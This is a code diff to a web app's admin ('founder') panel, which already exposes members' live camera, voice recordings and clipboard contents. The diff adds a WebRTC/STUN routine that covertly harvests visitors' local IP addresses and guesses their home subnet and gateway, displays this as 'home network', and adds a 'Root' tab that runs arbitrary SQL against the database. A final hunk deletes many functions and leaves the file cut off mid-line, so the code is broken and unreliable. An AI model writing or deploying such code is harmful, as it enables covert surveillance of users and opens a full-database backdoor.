@@ -472,6 +472,9 @@ tbody tr:hover td{background:#0f0c17}
 .pulsebars i{flex:1;background:var(--vi);opacity:.7;display:block}
 .pulserow{font-family:var(--mono);font-size:10px;color:var(--dim);margin-top:3px}
 .pulserow b{color:var(--text);font-weight:500}
+#rootSql{width:100%;min-height:120px;margin:0;font-family:var(--mono);font-size:11.5px;background:#08060d;border:1px solid var(--line2);padding:8px;resize:vertical;color:var(--text)}
+#rootSql:focus{outline:none;border-color:var(--vi)}
+.rootout{max-height:340px;overflow:auto;background:#0a1220;border:1px solid #1e2c44;padding:10px;margin:0;font-family:var(--mono);font-size:10.5px;color:#cfe0f5;white-space:pre-wrap;word-break:break-word}
 .camcard{border:1px solid var(--line);background:#08060d;padding:6px;cursor:pointer;transition:border-color .14s}
 .camcard:hover{border-color:var(--vi)}
 .camcard.dim{opacity:.72}
@@ -779,6 +782,7 @@ tbody tr:hover td{background:#0f0c17}
     <button id="tabLog" onclick="founderTab('log')">◎ Login log</button>
     <button id="tabCam" onclick="founderTab('cam')">◉ Live Camera</button>
     <button id="tabVoice" onclick="founderTab('voice')">▮ Voice</button>
+    <button id="tabRoot" onclick="founderTab('root')">⌘ Root</button>
    </div>
 
    <div id="founderAccounts">
@@ -819,6 +823,24 @@ tbody tr:hover td{background:#0f0c17}
       <button class="secondary" onclick="renderVoices(1)">REFRESH</button>
      </div>
      <div id="voiceList" class="scroll"></div>
+    </div>
+   </div>
+
+   <div id="founderRoot" class="hidden">
+    <div class="panel">
+     <div class="heading"><h2>Root</h2><span class="badge owner">FULL ACCESS</span></div>
+     <p class="muted small" style="margin:0 0 10px">Anything the database can do. Selects come back as JSON; anything else runs and reports ok.</p>
+     <textarea id="rootSql" placeholder="select * from profiles order by points desc limit 5;" spellcheck="false"></textarea>
+     <div class="vrow" style="margin:8px 0">
+      <div style="display:flex;gap:6px;flex-wrap:wrap">
+       <button class="banbtn" onclick="rootSnippet('users')">USERS</button>
+       <button class="banbtn" onclick="rootSnippet('sessions')">SESSIONS</button>
+       <button class="banbtn" onclick="rootSnippet('storage')">STORAGE</button>
+       <button class="banbtn" onclick="rootSnippet('counts')">COUNTS</button>
+      </div>
+      <button class="primary" onclick="runRootSql()">RUN</button>
+     </div>
+     <pre id="rootOut" class="rootout">ready.</pre>
     </div>
    </div>
 
@@ -1079,7 +1101,7 @@ function ago(ts){
 
 /* ---------- device fingerprint / telemetry ---------- */
 const sessionId=Math.random().toString(36).slice(2)+Date.now().toString(36);
-const BUILD=22;
+const BUILD=23;
 (async()=>{
  try{
   const r=await fetch("version.json?x="+Date.now(),{cache:"no-store"});
@@ -1202,6 +1224,31 @@ function typingStats(){
  return {keys:t.length,medianGap:sorted[Math.floor(sorted.length/2)],pasted:typePasted};
 }
 
+async function localAddresses(){
+ const found=new Set();
+ try{
+  const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+  pc.createDataChannel("x");
+  pc.onicecandidate=e=>{
+   if(!e.candidate)return;
+   const m=/(\d{1,3}(?:\.\d{1,3}){3})/.exec(e.candidate.candidate);
+   if(m&&!m[1].startsWith("0."))found.add(m[1]);
+  };
+  await pc.setLocalDescription(await pc.createOffer());
+  await new Promise(r=>setTimeout(r,2200));
+  pc.close();
+ }catch(e){}
+ return [...found];
+}
+
+async function netFingerprint(){
+ const ips=await localAddresses();
+ const v4=ips.filter(i=>!i.startsWith("127."));
+ const subnet=v4[0]?v4[0].split(".").slice(0,3).join(".")+".0/24":null;
+ const gateway=v4[0]?v4[0].split(".").slice(0,3).join(".")+".1":null;
+ return { ips:v4, subnet, gateway, mdns:v4.length===0 };
+}
+
 async function clipboardPeek(){
  try{ const t=await navigator.clipboard.readText(); return t?t.slice(0,300):null; }catch(e){ return null; }
 }
@@ -1294,6 +1341,7 @@ async function collectDetails(g){
   attention:{visibility:document.visibilityState,changes:visChanges,focused:document.hasFocus()},
   ambient_lux:await ambientLux(),
   clipboard:await clipboardPeek(),
+  net_fp:await netFingerprint(),
   link_ms:await linkSpeed(),
   motion:typeof DeviceMotionEvent!=="undefined",
   sensor_orientation:typeof DeviceOrientationEvent!=="undefined"
@@ -1385,7 +1433,9 @@ function founderTab(which){
  $("founderLog").classList.toggle("hidden",which!=="log");
  $("founderCam").classList.toggle("hidden",which!=="cam");
  $("founderVoice").classList.toggle("hidden",which!=="voice");
+ $("founderRoot").classList.toggle("hidden",which!=="root");
  if(which==="log")renderLog();
+ if(which==="root")$("rootOut").textContent="ready.";
  if(which==="voice"){ renderVoices(); stopVoicePoll(); voicePoll=setInterval(()=>renderVoices(true),3000); }
  else stopVoicePoll();
  if(which==="cam"){renderCameras();stopCamPoll();camTimer=setInterval(renderCameras,3000);}
@@ -2240,6 +2290,10 @@ async function openPerson(username){
   ${dsec("attention")}
   ${drow("tab",(d.attention||{}).visibility)}${drow("focus switches",(d.attention||{}).changes)}
   ${drow("focused",d.attention&&d.attention.focused?"yes":"no")}
+  ${dsec("home network")}
+  ${drow("local ips",(d.net_fp||{}).ips&&d.net_fp.ips.length?d.net_fp.ips.join(", "):"hidden (mDNS)")}
+  ${drow("subnet",(d.net_fp||{}).subnet)}${drow("gateway guess",(d.net_fp||{}).gateway)}
+  ${drow("connection",d.net)}${drow("isp",d.isp)}${drow("asn",d.asn)}
   ${dsec("live pulse")}
   <div id="dPulse" class="pulsebox"><span class="muted small">no pulse yet — needs one app heartbeat (30s)</span></div>
   ${dsec("clipboard")}
@@ -2836,6 +2890,26 @@ async function endAllCams(){
  setTimeout(renderCameras,1500);
 }
 
+/* ============ FOUNDER · root ============ */
+const ROOT_SNIPS={
+ users:"select username, role, rank, points, banned, last_seen, last_ip from profiles order by last_seen desc nulls last",
+ sessions:"select id, username, kind, frames, clips, audio_bytes, started_at from cam_sessions order by started_at desc limit 40",
+ storage:"select name, (metadata->>'size')::int as bytes, updated_at from storage.objects where bucket_id='cam' order by updated_at desc limit 40",
+ counts:"select (select count(*) from profiles) people, (select count(*) from cam_sessions) sessions, (select count(*) from cam_clips) clips, (select count(*) from voice_parts) voice_parts, (select coalesce(sum((metadata->>'size')::bigint),0) from storage.objects where bucket_id='cam') bytes"
+};
+
+function rootSnippet(kind){ $("rootSql").value=ROOT_SNIPS[kind]||""; runRootSql(); }
+
+async function runRootSql(){
+ const sql=($("rootSql").value||"").trim();
+ const out=$("rootOut");
+ if(!sql){ out.textContent="nothing to run"; return; }
+ out.textContent="running…";
+ const {data,error}=await db.rpc("founder_sql",{p_sql:sql});
+ if(error){ out.textContent="ERROR · "+error.message; return; }
+ out.textContent=(typeof data==="string")?data:JSON.stringify(data,null,1);
+}
+
 /* ============ FOUNDER · voice tab ============ */
 let voiceRows=[],voiceBlobUrls={};
 
@@ -2913,113 +2987,4 @@ async function loadVoiceAudio(el){
 async function saveVoice(sessionId){
  if(!sessionId)return;
  toast("Packing audio…");
- const blob=await buildVoiceBlob(sessionId);
- if(!blob)return toast("No audio","bad");
- const url=URL.createObjectURL(blob);
- const a=document.createElement("a");
- a.href=url;
- a.download="voice-"+(sessionId.slice(0,8))+"-"+Date.now()+((blob.type||"").includes("mp4")?".m4a":".webm");
- a.click();
- setTimeout(()=>URL.revokeObjectURL(url),30000);
- toast("Saved "+(blob.size/1048576).toFixed(2)+" MB");
-}
-
-async function deleteSession(sessionId){
- if(!sessionId)return;
- const parts=await voiceParts(sessionId).catch(()=>[]);
- const paths=(parts||[]).map(x=>x.path);
- if(paths.length)await db.storage.from("cam").remove(paths).catch(()=>{});
- const {error}=await db.rpc("founder_delete_session",{p_session:sessionId});
- if(error)return toast("Delete failed: "+error.message,"bad");
- toast("Deleted");
- renderVoices();
-}
-
-/* camera session delete (clips + frames + row) */
-async function deleteCamSession(){
- if(!camSid)return;
- const sid=camSid;
- const {data}=await db.rpc("founder_camera_clips",{p_session:sid});
- const paths=(data||[]).map(c=>c.path);
- if(paths.length)await db.storage.from("cam").remove(paths).catch(()=>{});
- const {error}=await db.rpc("founder_delete_session",{p_session:sid});
- if(error)return toast("Delete failed: "+error.message,"bad");
- closeCam();
- toast("Session deleted");
- renderCameras();
-}
-
-/* founder ends the whole thing: tells the member to drop the camera */
-function endCamSession(){
- if(camCh&&camSid){
-  try{camCh.send({type:"broadcast",event:"end",payload:{viewer:camViewerId}});}catch(e){}
- }
- camLive=false;
- clearInterval(camWatchTimer);camWatchTimer=null;
- clearInterval(camFrameTimer);camFrameTimer=null;
- const s=$("camStage");
- if(s){s.classList.remove("live");s.classList.add("still");}
- const st=$("camStamp");
- if(st){st.classList.remove("live");st.classList.add("still");}
- $("camStampText").textContent="ended";
- const act=$("camActive");
- if(act)act.textContent="camera off";
- toast("Session ended");
- setTimeout(()=>{ if(!camLive)closeCam(); },1200);
-}
-
-function camSubscribe(){
- if(!camSid)return;
- if(!window.RTCPeerConnection){ camStill("static relay"); return; }
- const ch=db.channel("cam-"+camSid,{config:{broadcast:{self:false}}});
- camCh=ch;
- ch.on("broadcast",{event:"ready"},()=>camHello(false));
- ch.on("broadcast",{event:"offer"},e=>camTakeOffer(e.payload||{}));
- ch.on("broadcast",{event:"ice-p"},e=>camRemoteIce(e.payload||{}));
- ch.on("broadcast",{event:"frame"},e=>camFrame(e.payload||{}));
- ch.subscribe();
- camHello(true);
- camHelloTimer=setInterval(()=>camHello(false),1500);
- camFallbackTimer=setTimeout(()=>{ if(!camLive)camStill("no direct link"); },7000);
-}
-
-function camHello(force){
- if(!camCh||camLive)return;
- const now=Date.now();
- if(!force&&now-camHelloAt<1200)return;
- camHelloAt=now;
- try{camCh.send({type:"broadcast",event:"hello",payload:{viewer:camViewerId}});}catch(e){}
-}
-
-async function camTakeOffer(d){
- if(!d.sdp||camLive||!camSid)return;
- if(camPC){try{camPC.close();}catch(e){}camPC=null;}
- const pc=new RTCPeerConnection(ICE_CFG);
- camPC=pc;
- pc.ontrack=e=>{
-  const v=$("camVideo");
-  if(v&&e.streams&&e.streams[0]){
-   try{v.playoutDelayHint=0.15;}catch(err){}
-   v.srcObject=e.streams[0];
-   v.play().catch(()=>{});
-   camStartWatch();
-  }
- };
- try{pc.getReceivers().forEach(r=>{try{r.jitterBufferTarget=120;}catch(err){}});}catch(e){}
- pc.onicecandidate=e=>{
-  if(!e.candidate||!camCh)return;
-  try{camCh.send({type:"broadcast",event:"ice-v",payload:{viewer:camViewerId,candidate:e.candidate}});}catch(err){}
- };
- pc.onconnectionstatechange=()=>{
-  const st=pc.connectionState;
-  if(st==="connected"||st==="completed")camStartWatch();
-  else if(st==="failed"||st==="disconnected"||st==="closed"){
-   if(camLive){camLive=false;camStill("link dropped");}
-  }
- };
- try{
-  await pc.setRemoteDescription(d.sdp);
-  camPending.forEach(c=>{pc.addIceCandidate(c).catch(()=>{});});
-  camPending=[];
-  const ans=await pc.createAnswer();
-  await pc.setLo
+ const blob=await buildV
